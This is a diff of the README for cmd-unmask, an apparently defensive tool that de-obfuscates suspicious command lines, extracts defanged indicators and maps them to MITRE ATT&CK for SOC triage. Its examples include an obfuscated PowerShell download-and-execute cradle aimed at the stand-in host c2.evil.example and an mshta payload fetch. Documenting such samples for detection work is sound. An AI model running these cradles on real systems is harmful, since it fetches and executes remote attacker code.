@@ -1,86 +1,62 @@
 <div align="center">
 
-# 🛡️ cmd-unmask
+# cmd-unmask
 
 **Static Command-Line De-Obfuscation & Behavioral Triage Tracer Script**
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Dependencies: Zero (Stdlib)](https://img.shields.io/badge/dependencies-zero%20(stdlib)-009688.svg)](#)
+[![Python 3.10+ stdlib-only](https://img.shields.io/badge/python-3.10%2B%20stdlib--only-blue.svg)](#)
+[![Dependencies: Zero](https://img.shields.io/badge/dependencies-zero-009688.svg)](#)
 [![Tests](https://img.shields.io/badge/tests-130%20passed-success.svg)](#)
+[![FPR: 0.0000](https://img.shields.io/badge/FPR-0.0000%20(62%20fixtures)-brightgreen.svg)](#)
 
-[Install](#installation) · [Usage](#usage) · [How it works](#how-it-works) · [Limitations](#limitations)
+[Quickstart](#quickstart) · [Architecture](#architecture) · [Detection Rigidity](#detection-rigidity) · [CLI Reference](#cli-reference) · [ADRs](docs/adr/README.md)
 
 </div>
 
-**cmd-unmask** is an open-source static command-line de-obfuscation and behavioral triage Tracer Script designed for cyber defense teams, SOC analysts, and detection engineers. It peels multi-layered command-line obfuscation (`cmd.exe` / PowerShell / Bash), extracts and defangs Indicators of Compromise (IOCs), maps suspicious execution patterns to MITRE ATT&CK, and generates ready-to-paste SOC ticket notes in milliseconds—100% static, offline, and zero-dependency.
+During live Tier-1/Tier-2 SOC triage, analysts lose minutes manually decoding nested Base64, Gzip, caret-escaped `cmd.exe`, and PowerShell expressions while avoiding local EDR CLI inspection blocks. `cmd-unmask` statically peels multi-layer obfuscation, extracts behavioral capabilities and defanged IOCs, explains every `BENIGN` or malicious verdict, and synthesizes ready-to-paste offense notes and Sigma YAML rules in sub-millisecond latency—using 100% Python standard library with zero external dependencies and zero code execution.
 
 ---
 
-## ⚡ The 5-Second Pitch (Before vs. After)
+<a id="architecture"></a>
+## Architecture Pipeline
 
-**1. What lands in your QRadar / Wazuh / SentinelOne Offense:**
-```powershell
-p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
-```
-
-**2. What `cmd-unmask -p --copy-note` puts on your clipboard in milliseconds:**
 ```text
-[SOC TRIAGE NOTE - clipboard]
-Verdict       : CRITICAL (Risk Score: 100/100)
-Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
-Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
-Unmasked Cmd  :
-  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
-Extracted IOCs:
-  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
-  - [DOMAIN] c2[.]evil[.]example
-MITRE ATT&CK  :
-  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
-  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
-  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
-  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
+  [ Clipboard / Stdin / SIEM JSON / File / CLI ]
+                        |
+                        v
+             +---------------------+
+             |  Ingestion Pipeline |  Auto-SIEM JSON/JSONL, quote unwrapping,
+             +---------------------+  Event ID 4688 / Sysmon EID 1 lineage
+                        |
+                        v
+             +---------------------+
+             |    Unpacking DAG    |  Two-pass normalizer, expression resolver,
+             +---------------------+  UTF-16LE Base64, Gzip/Deflate, Hex/URL/XOR
+                        |             (bounded: depth<=10, nodes<=64, 256KB, 3.0s)
+                        v
+             +---------------------+
+             | Classifier & VA     |  MITRE ATT&CK rules, Spawn Matrix, staging
+             | Rigidity            |  paths, Authorized VA Audit Baseline suppression
+             +---------------------+
+                        |
+                        v
+             +---------------------+
+             | Capability & IOC    |  File writes, Win32/.NET P/Invoke, registry,
+             | Extractor           |  defanged IOCs, explicit Verdict Rationale
+             +---------------------+
+                        |
+                        v
+             +---------------------+
+             | Ticket Note & Sigma |  Deduplicated timeline, --full truncation,
+             +---------------------+  auto-copied [SOC TRIAGE NOTE], Sigma YAML
 ```
 
 ---
 
-## 🎯 Why `cmd-unmask`?
+<a id="quickstart"></a>
+## Live Shift Quickstart
 
-During live L1/L2 alert triage, every minute spent manually baking CyberChef recipes or fixing broken Base64 padding slows down containment. Existing workflows force trade-offs between speed, safety, and accuracy:
-
-| Capability | `cmd-unmask` | Manual CyberChef Tabs | Naive Regex Scripts | Dynamic Sandbox / `eval` |
-| :--- | :--- | :--- | :--- | :--- |
-| **Multi-Layer Interleaving** (`^` + `-enc` + `Gzip` + `-f`) | **Automatic BFS DAG** | Manual recipe chaining | Fails on nested layers | Unpacks only if executed |
-| **Data Sovereignty / Air-Gap Safe** | **100% Offline CLI** | Browser tab / copy-paste risk | Local | Often cloud-hosted |
-| **Execution Safety on Analyst Host** | **100% Static (Zero `eval`)** | Safe | Safe | **High risk if run locally** |
-| **Workstation CLI Argument Safety** | **Native `-p` Clipboard Mode** | N/A | Blocked by local AMSI/EDR | Blocked by local AMSI/EDR |
-| **`.NET` Namespace False-Positive Suppression** | **Contextual IOC Gate** | Extracts `[Net.WebClient]` as domain | Massive False Positives | N/A |
-| **SOC Offense Ticket Formatting** | **Instant (`--copy-note`)** | Manual typing & defanging | Raw text dump | Heavy PDF/JSON report |
-| **Runtime Dependencies** | **Zero (Python 3 Stdlib)** | Browser required | Varies (`pip` bloat) | Heavy VM / Docker stack |
-
-## ✨ Key Features
-
-- 🔄 **Two-Pass Shell Normalization**: Strips `cmd.exe` carets (`^`), empty quotes (`""`), `%var:~offset,len%` slices, and PowerShell backticks (`` ` ``) without corrupting quoted literals.
-- 🧩 **Static Expression Folding**: Resolves PowerShell format operators (`-f`), `[char]` casts, `-join`, `.Replace()` / `-replace`, string concatenation, and Bash ANSI-C quoting (`$'\x..'`).
-- 🌲 **Bounded Interleaved Unpacking DAG**: Explores nested payloads via BFS (`max_depth=10`, `max_nodes=64`) decoding Base64, Gzip, Deflate (256 KB ceiling), Hex, URL, CharCode, and gated XOR.
-- 🛡️ **Contextual IOC Extraction & Defanging**: Full-DAG harvesting of URLs, domains, IPs, file paths, and hashes with `.NET` namespace false-positive suppression and automatic defanging.
-- 🎯 **MITRE ATT&CK Behavioral Scoring**: Dual-stage risk scoring (0–100) mapping unmasked payloads and LOLBins (`certutil`, `mshta`, `rundll32`, `wmic`, `bits`) to MITRE techniques.
-- 📋 **Frictionless Clipboard & Batch Ingestion**: Direct OS clipboard triage (`-p`, `--copy-note`), interactive TTY prompt, and automated SIEM log parsing (JSON, JSONL, text).
-- 🪶 **Zero External Dependencies**: Built 100% on Python standard library (`>= 3.10`), offline and air-gap safe with strictly zero dynamic execution (`eval`/`exec`).
-
----
-
-<a id="installation"></a>
-## 📦 Installation
-
-`cmd-unmask` requires Python `>= 3.10` and installs with **zero external dependencies** (100% Python standard library).
-
-### From Git URL
-
-```bash
-pip install git+https://github.com/VelkaRepo/cmd-unmask.git
-```
-
-### From Source
+### Installation
 
 ```bash
 git clone https://github.com/VelkaRepo/cmd-unmask.git
@@ -88,175 +64,155 @@ cd cmd-unmask
 pip install -e .
 ```
 
----
-
-<a id="usage"></a>
-## 🚀 CLI Usage
-
-### CLI Options
-
-| Flag | Argument | Description | Default |
-| :--- | :--- | :--- | :--- |
-| `-c`, `--cmd` | `TEXT` | Single obfuscated command string to unmask | None |
-| `-f`, `--file` | `PATH` | Path to raw text, JSON, or JSONL input file | None |
-| `-p`, `--paste` | — | Read obfuscated command directly from OS clipboard | `False` |
-| `--field` | `NAME` | Custom JSON field name containing the command line | Auto-detect |
-| `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
-| `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
-| `--no-copy` | — | Disable automatic clipboard copy of SOC Ticket Note on interactive runs | `False` |
-| `--no-sigma` | — | Disable automatic Sigma YAML output on non-benign interactive runs | `False` |
-| `--full` | — | Print complete multi-line unmasked payloads without head/tail truncation | `False` |
-| `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
-| `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
-| `--max-depth` | `INT` | Maximum Unpacking DAG recursion depth | `10` |
-| `--timeout` | `FLOAT` | Per-command unpacking timeout in seconds | `3.0` |
-| `--fail-on` | `SEV` | Exit code 2 if severity meets or exceeds `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` (or if verdict is `UNKNOWN`) | None |
-| `--benchmark` | `[PATH]` | Run Regression Corpus benchmark on built-in corpus or custom JSON/JSONL file | None |
-| `--corpus-dir` | `DIR` | Load `benign.jsonl` and `malicious.jsonl` from a custom corpus directory | None |
-| `--max-fpr` | `FLOAT` | Maximum allowed False Positive rate for `--benchmark` Detection Rigidity Gate | `0.0` |
-| `-v`, `--verbose` | — | Print row-by-row fixture results in `--benchmark` summary output | `False` |
-| `--parent` | `IMAGE` | Optional parent process image/name for single or clipboard triage (e.g. `winword.exe`) | None |
-| `--parent-cmd` | `TEXT` | Optional parent process command line for single or clipboard triage | None |
-| `--image` | `PATH` | Optional target process image path for single or clipboard triage | None |
-| `-h`, `--help` | — | Show CLI help message and exit | — |
-
-### 1. Clipboard & Interactive Mode (Avoids Local CLI Inspection Blocks)
-Passing raw malicious stagers directly as command-line arguments (`-c "powershell -enc ..."`) often triggers local Windows Defender / SentinelOne CLI blocks (`Access is denied`). Ingesting directly from the OS clipboard avoids exposing the payload in the process argument list. Copy the alert command from your SIEM and run:
+### Zero-Flag & Tactical Workflows
 
 ```bash
-# Zero-flag clipboard triage (auto-parses SIEM JSON/JSONL or raw commands, auto-copies note & emits Sigma)
+# 1. Zero-flag clipboard triage (auto-detects raw commands or SIEM JSON/JSONL,
+#    auto-copies [SOC TRIAGE NOTE], and emits Sigma YAML on non-benign TTY runs)
 cmd-unmask
 
-# Positional auto-detect: raw command string OR SIEM file path
-cmd-unmask "<cmd>"
-cmd-unmask alert.json
+# 2. Positional auto-detect (file path -> batch SIEM ingestion; string -> single command)
+cmd-unmask alerts.jsonl --format jsonl > triaged.jsonl
+cmd-unmask "p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgA..."
 
-# Explicit flags (still 100% supported)
-cmd-unmask -p --copy-note
-```
+# 3. Inspect complete multi-line scripts without head/tail truncation
+cmd-unmask --full
 
-### 2. Single Command & Standard Input
-```bash
-# Analyze a single command string (defaults to --format pretty)
-cmd-unmask -c "powershell -c ('{1}{0}' -f 'Client','Net.Web')"
-
-# Disable ANSI color codes or emit raw (undefanged) IOCs
-cmd-unmask -c "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" --no-color --no-defang
-
-# Pipe from stdin and emit structured JSON
-echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format json
-```
-
-### 3. Batch SIEM & EDR Ingestion
-`cmd-unmask` natively ingests raw line-delimited text files, JSON arrays, and JSONL exports from **QRadar, Wazuh, SentinelOne, FortiGate, and ArcSight**. It auto-detects standard command-line fields (`CommandLine`, `command_line`, `cmd`, `process.command_line`, `data.win.eventdata.commandLine`, `payload`), unescapes outer JSON wrapper quotes (`\"` -> `"`), and isolates malformed records so a corrupt log line never crashes a batch run:
-
-```bash
-# Batch-triage a JSONL export from Wazuh or SentinelOne and emit JSONL verdicts
-cmd-unmask -f alerts.jsonl --format jsonl > triaged_alerts.jsonl
-
-# Specify a custom JSON key and enforce a CI/SOAR severity exit gate (exit code 2 on HIGH or CRITICAL)
-cmd-unmask -f qradar_offense.json --field CustomProcessCmd --fail-on HIGH
-```
-
-### 4. Corpus Regression Benchmark & Detection Rigidity Gate
-Validate de-obfuscation accuracy, Precision/Recall/F1, False Positive Rate (FPR), and p50/p95 latency against the built-in Regression Corpus (`corpus/benign.jsonl` and `corpus/malicious.jsonl`) or a custom dataset:
-
-```bash
-# Run built-in Regression Corpus benchmark (exits 2 if any fixture fails or FPR > 0.0)
-cmd-unmask --benchmark
-
-# Run with row-by-row fixture breakdown
-cmd-unmask --benchmark --verbose
-
-# Run against a custom corpus directory with JSON output for CI gates
-cmd-unmask --benchmark --corpus-dir ./my_corpus --max-fpr 0.0 --format json
-```
-
-### 5. Parent-Child Process Lineage & Staging Path Triage
-Supply Event ID 4688 / Sysmon EID 1 lineage context via SIEM JSON/JSONL ingestion or manually via `--parent` and `--image`:
-
-```bash
-# Flag Office or Web Server spawning a shell/LOLBin and emit Sigma ParentImage selection
+# 4. Supply parent-child process lineage (Event ID 4688 / Sysmon EID 1)
 cmd-unmask -c "cmd.exe /c whoami" --parent "C:\Windows\System32\inetsrv\w3wp.exe" --sigma
+
+# 5. Run Regression Corpus benchmark & Detection Rigidity Gate (row-by-row)
+cmd-unmask --benchmark -v
+```
+
+### Example Output (`--format pretty --no-color --no-sigma`)
+
+```text
+╔════════════════════════════════════════════════════════════════════╗
+║ Triage Verdict [cli] | Severity: HIGH (70/100)                     ║
+╚════════════════════════════════════════════════════════════════════╝
+
+[1] UNMASKING TIMELINE (LAYER-BY-LAYER)
+  └─► Step 0 [Raw Input]
+      powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
+
+[2] EXTRACTED IOCs (DEFANGED)
+  ├─► [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 0 [Raw Input])
+  └─► [domain] c2[.]evil[.]example (from Step 0 [Raw Input])
+
+[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)
+  ├─► T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
+  └─► T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
+
+[BEHAVIORAL CAPABILITIES]
+  ├─► Network: Net.WebClient
+  └─► Network: DownloadString
+
+[VERDICT RATIONALE]
+  └─► HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
+
+[4] READY-TO-PASTE SOC TICKET NOTE
+────────────────────────────────────────────────────────────────────
+[SOC TRIAGE NOTE - cli]
+Verdict       : HIGH (Risk Score: 70/100)
+Obfuscation   : None (Unobfuscated)
+Rationale     : HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
+Raw Command   : powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.ev... (114 chars total)
+Unmasked Cmd  :
+  powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
+Capabilities  :
+  - Network: Net.WebClient
+  - Network: DownloadString
+Extracted IOCs:
+  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
+  - [DOMAIN] c2[.]evil[.]example
+MITRE ATT&CK  :
+  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
+  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
+────────────────────────────────────────────────────────────────────
 ```
 
 ---
 
-## 🖥️ Live Terminal Output
+<a id="detection-rigidity"></a>
+## Detection Coverage & False-Positive Rigidity
 
-<!-- demo.gif goes here after recording -->
+Validated against 62 labeled corpus fixtures (`32` malicious, `30` benign enterprise commands) with `Precision=1.0000`, `Recall=1.0000`, `FPR=0.0000`, and `p50 < 1ms` per command.
 
-By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy.
-
-See the complete [Live Terminal Output Example](docs/architecture.md#live-terminal-output) in [`docs/architecture.md`](docs/architecture.md).
-
----
-
-<a id="how-it-works"></a>
-## 🏗️ Architecture & Design Decisions
-
-`cmd-unmask` processes commands through a deterministic 4-pillar pipeline: Ingestion Pipeline & Shell Normalization, Bounded Interleaved Unpacking DAG & Expression Resolution, Full-DAG Contextual IOC Extraction & Defanging, and MITRE ATT&CK Behavioral Classification.
-
-See the complete [Four-Pillar Architecture Diagram](docs/architecture.md#four-pillar-architecture) in [`docs/architecture.md`](docs/architecture.md).
-
-### Domain Glossary & Architecture Decision Records (ADRs)
-- **Ubiquitous Language**: [`GLOSSARY.md`](GLOSSARY.md) defines canonical domain terms (`Tracer Script`, `Ingestion Pipeline`, `Unpacking DAG`, `Payload Node`, `Detection Rigidity`, `Primary Unmasked Payload`, `Defanged IOC`, `Triage Verdict`).
-- **Architecture Decision Records (`docs/adr/`)**:
-  - [ADR-0001: Static Standard-Library-Only Analysis with Zero Dynamic Execution](docs/adr/0001-static-stdlib-only-analysis.md)
-  - [ADR-0002: Quote-Aware Two-Pass Shell Normalizer](docs/adr/0002-quote-aware-two-pass-shell-normalizer.md)
-  - [ADR-0003: Bounded Unpacking DAG with Pruning Gates and Padding-Tolerant Base64](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)
-  - [ADR-0004: Case-Aware Bottom-Up Static Expression Resolver](docs/adr/0004-case-aware-static-expression-resolver.md)
-  - [ADR-0005: Full-DAG IOC Harvesting and Dual-Stage Behavioral Intent Scoring](docs/adr/0005-full-dag-ioc-harvesting-and-intent-scoring.md)
-  - [ADR-0006: Interleaved Node Processing Cycle and Deterministic Primary Leaf Ranking](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)
-  - [ADR-0007: Contextual IOC Validation to Suppress Namespace and Hex-Blob False Positives](docs/adr/0007-contextual-ioc-false-positive-suppression.md)
-  - [ADR-0008: Operator UX, Win32 Clipboard Ingestion, and Layer-by-Layer Timeline Rendering](docs/adr/0008-operator-ux-clipboard-ingestion-and-timeline-rendering.md)
+| Mechanism | Threat / Operational Coverage | False-Positive Rigidity |
+| :--- | :--- | :--- |
+| **Obfuscation Unpacking** | `cmd.exe` carets/env-slices, PS backticks/`-f`/`[char]`/`-join`, UTF-16LE Base64 (including raw standalone blobs), Gzip/Deflate, Hex/URL/XOR | Entropy + printable-ratio gates; `@' ... '@` here-strings preserved; 256 KB stream ceiling |
+| **Process Lineage & Staging** | Office (`WINWORD.EXE`), web server (`w3wp.exe`), WMI (`WmiPrvSE.exe`) spawn matrix; `\Users\Public\`, `\AppData\Local\Temp\`, `/dev/shm/` staging | Canonical OS/admin parents (`explorer.exe -> cmd.exe`, `services.exe -> svchost.exe`) and `Program Files` paths never trigger |
+| **Win32 P/Invoke vs. VA Audit** | Flags offensive memory-injection APIs (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`, `OpenProcess` — `T1055`) | **Authorized Audit Baseline** recognizes read-only Nessus/VA `Netapi32.dll` (`NetGetJoinInformation`, `NetApiBufferFree`) checks as `BENIGN (0/100)` |
+| **Contextual IOC Extraction** | URLs, domains, IPv4/IPv6, file paths, MD5/SHA1/SHA256, and cloud metadata SSRF (`169.254.169.254`) | Suppresses `.NET` namespaces (`Net.WebClient`), hex blobs, and link-local-only metadata queries from `T1105` escalation |
+| **Analyst Clarity & Sigma** | Non-IOC capabilities (file writes, P/Invoke, registry, process, network), explicit `Verdict Rationale`, and vendor-neutral Sigma YAML | Machine formats (`json`, `jsonl`) remain strictly pure; smart head/tail truncation avoids terminal flooding (`--full` overrides) |
 
 ---
 
-<a id="limitations"></a>
-## ⚠️ Limitations
+<a id="cli-reference"></a>
+## Grouped CLI Reference
 
-While `cmd-unmask` is engineered for high detection rigidity and deep static unpacking, several architectural trade-offs apply:
+Matches `python -m cmd_unmask --help`:
 
-- **100% Static Analysis Only**: `cmd-unmask` never executes untrusted code, spawns child shells, or calls dynamic evaluators (`eval()` / `exec()`). Commands that depend on live network responses, remote C2 stagers, or runtime host state cannot be dynamically completed ([ADR-0001](docs/adr/0001-static-stdlib-only-analysis.md)).
-- **Runtime-Built Payloads Unresolved**: Payloads assembled through complex runtime logic, JIT compilation, or programmatic variable assembly requiring an active PowerShell/Bash interpreter are not dynamically evaluated.
-- **Single-Byte XOR Only**: Heuristic XOR brute-forcing is restricted to single-byte keys (`0x01`–`0xFF`) gated by entropy and anchor thresholds. Multi-byte XOR keys or stream ciphers are not recovered unless the key or operator is explicitly present in the static command syntax ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).
-- **Bounded Unpacking DAG**: To prevent resource exhaustion, the Unpacking DAG enforces deterministic bounds: maximum depth of 10 (`max_depth = 10`), maximum of 64 nodes (`max_nodes = 64`), and a 3.0-second per-command timeout ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md), [ADR-0006](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)).
-- **Decompression Ceiling**: Gzip and Deflate streams enforce a strict 256 KB chunked decompression limit (`max_stream_bytes = 262,144`) to protect analyst endpoints against zip-bombs ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).
+### Common Triage
+| Flag | Argument | Description | Default |
+| :--- | :--- | :--- | :--- |
+| `target` | — | Optional file path or raw command string (auto-detected) | `None` |
+| `-c`, `--cmd` | `CMD` | Single obfuscated command string to unmask | `None` |
+| `-f`, `--file` | `FILE` | Path to raw text, JSON, or JSONL input file | `None` |
+| `-p`, `--paste` | — | Read obfuscated command directly from the OS clipboard | `False` |
+| `--full` | — | Print complete multi-line unmasked payloads without head/tail truncation | `False` |
+| `--no-copy` | — | Disable automatic clipboard copy of SOC Ticket Note on interactive runs | `False` |
+| `--no-sigma` | — | Disable automatic Sigma YAML output on non-benign interactive runs | `False` |
+
+### Output & Detection
+| Flag | Argument | Description | Default |
+| :--- | :--- | :--- | :--- |
+| `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
+| `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
+| `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
+| `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
+| `--sigma` | — | Synthesize and print Sigma YAML rule(s) to stdout for non-benign findings | `False` |
+| `--sigma-out` | `SIGMA_OUT` | Write synthesized Sigma YAML rule(s) to a file or directory path | `None` |
+| `--parent` | `PARENT` | Optional parent process image/name for single or clipboard triage | `None` |
+| `--parent-cmd` | `PARENT_CMD` | Optional parent process command line for single or clipboard triage | `None` |
+| `--image` | `IMAGE` | Optional target process image path for single or clipboard triage | `None` |
+
+### Benchmark & Advanced
+| Flag | Argument | Description | Default |
+| :--- | :--- | :--- | :--- |
+| `--field` | `FIELD` | Custom JSON field name containing the command line | Auto-detect |
+| `--max-depth` | `MAX_DEPTH` | Maximum Unpacking DAG depth | `10` |
+| `--timeout` | `TIMEOUT` | Per-command unpacking timeout in seconds | `3.0` |
+| `--fail-on` | `SEV` | Exit code 2 if severity meets or exceeds `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` (or `UNKNOWN`) | `None` |
+| `--benchmark` | `[PATH]` | Run Regression Corpus benchmark against built-in corpus or custom file | `None` |
+| `--corpus-dir` | `DIR` | Load `benign.jsonl` and `malicious.jsonl` from a custom corpus directory | `None` |
+| `--max-fpr` | `MAX_FPR` | Maximum allowed False Positive rate for Detection Rigidity Gate | `0.0` |
+| `-v`, `--verbose` | — | Print row-by-row fixture results in `--benchmark` summary output | `False` |
 
 ---
 
-## 🧪 Verification & Test Suite
+## Architecture Decision Records & Domain Docs
 
-Run the full unit and integration test suite (60 tests covering DOSfuscation, expression folding, multi-layer DAG unpacking, zip-bomb ceilings, IOC false-positive suppression, MITRE classification, sanitized real-world fixtures, and CLI UX) via Python's built-in `unittest` discovery:
+- **ADR Index**: [`docs/adr/README.md`](docs/adr/README.md) (`ADR-0001` through `ADR-0014`)
+- **Architecture Diagrams**: [`docs/architecture.md`](docs/architecture.md)
+- **Ubiquitous Language**: [`GLOSSARY.md`](GLOSSARY.md)
+
+---
+
+## Verification, Limitations & Security
+
+### Development & Testing
 
 ```bash
+# Run full unit and integration test suite (130 tests)
 python -m unittest discover -s tests -v
+
+# Run Regression Corpus benchmark and Detection Rigidity Gate
+python -m cmd_unmask --benchmark --no-color
 ```
 
----
-
-## 🗺️ Roadmap
-
-- [ ] **Expanded LOLBin Coverage**: Additional living-off-the-land utilities across Linux and macOS environments.
-- [ ] **Sigma Rule Generation**: Automatically generate draft Sigma detection rules from identified MITRE ATT&CK behaviors.
-- [ ] **PE/ELF Header Carving**: Direct carving and hashing of embedded portable executables and shellcode buffers.
-- [ ] **SOAR / Webhook Formatter**: Native JSON alert formatting tailored for automated SOAR ingestion pipelines.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please adhere to the following engineering standards:
-1. **Zero External Dependencies**: Keep all implementation code strictly within the Python standard library.
-2. **Defensive Error Handling**: Ensure no malformed artifact or corrupt log can cause an unhandled exception or crash.
-3. **Test-Driven Verification**: Add unit tests under `tests/` for any new decoder, normalizer rule, or IOC extractor, and ensure the test suite passes before submitting:
-   ```bash
-   python -m unittest discover -s tests -v
-   ```
-
----
-
-## 🔒 Security
-
-`cmd-unmask` is strictly an on-demand static analysis Tracer Script. It **never** executes input command lines, spawns child shells (`cmd.exe`, `powershell.exe`, `bash`), or invokes dynamic evaluation engines (`eval()`, `exec()`). All string reductions, Base64 decodings, and decompression steps operate through pure memory and standard-library data parsing with bounded resource ceilings, ensuring that analysts can safely inspect live, untrusted, or potentially destructive stagers on restricted workstations ([ADR-0001](docs/adr/0001-static-stdlib-only-analysis.md)).
+### Security & Limitations
+- **100% Static Analysis**: `cmd-unmask` never executes untrusted code, spawns child shells, or calls `eval()`/`exec()`. Runtime-only payloads requiring live C2 responses or active interpreter state cannot be resolved statically ([ADR-0001](docs/adr/0001-static-stdlib-only-analysis.md)).
+- **Bounded Resource Ceilings**: Unpacking enforces `max_depth=10`, `max_nodes=64`, `max_stream_bytes=262,144` (256 KB), and `timeout=3.0s` ([ADR-0003](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)).
+- **Single-Byte XOR Only**: Heuristic XOR brute-force is limited to single-byte keys (`0x01`–`0xFF`) gated by entropy and anchor checks.
